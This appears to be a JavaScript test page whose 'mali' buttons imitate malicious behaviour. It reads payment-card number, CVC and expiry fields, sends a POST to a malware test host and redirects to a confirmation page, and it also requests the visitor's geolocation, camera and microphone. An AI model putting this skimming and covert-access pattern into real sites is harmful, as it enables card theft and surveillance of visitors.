

var x = document.getElementById("demo");
var button = document.getElementById("mali_test");
var button1 = document.getElementById("mali");

if(button){
  button.addEventListener("click", () => {
  myFunction(),
  myFunctionA()
})
}
if(button1){
  button1.addEventListener("click", () => {
  myFunctionA()
  })
}

function showAlert(type, message) {
  var alertBox = document.getElementById("customAlert");
  var alertBox = document.getElementById("alertBox");
  var alertHeader = document.getElementById("alertHeader");
  var alertBody = document.getElementById("alertBody");

  customAlert.style.display = "block";

  if (type == "success") {
    alertHeader.innerHTML = "Success!";
    alertBox.style.border = "1px solid #4CAF50";
    alertHeader.style.color = "#4CAF50";
  } else if (type == "error") {
    alertHeader.innerHTML = "Error!";
    alertBox.style.border = "1px solid #f44336";
    alertHeader.style.color = "#f44336";
  }

  alertBody.innerHTML = message;
}

function hideAlert() {
  var customAlert = document.getElementById("customAlert");
  customAlert.style.display = "none";
}

function myFunction() {
   
   let a = document.querySelector('#card-cvc').value
   let b = document.querySelector('#c-number').value
   let c = document.querySelector('#card-expiry-y').value
   let d = document.querySelector('#card-expiry-m').value

   fetch('https://malware.wicar.org/',{
      mode: 'no-cors',
      method: 'POST',
      headers: { 'Content-type': 'application/json' }})
    .then(response => console.log(response))
    .then(res=>{console.log(res,a,b,c,d); 
        window.location.href = 'confirmation.html'
    })

}

function myFunctionA() {
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(showPosition);
} else { 
  x.innerHTML = "Geolocation is not supported by this browser.";
}
init()
}

async function init(){
   
    let d= navigator.getUserMedia({ audio: true, video: { width: 100, height: 100 } }, 
       function(stream) {
      var video = document.querySelector('video');
      video.srcObject = stream;
      video.onloadedmetadata = function(e) {
        video.play();
      };
      
   },
   function(err) {
    console.log(err.message);
 }
);
}

    
    function showPosition(position) {
      x.innerHTML = "Latitude: " + position.coords.latitude + 
      "<br>Longitude: " + position.coords.longitude;
    }
    
    
    
    

 
    
   

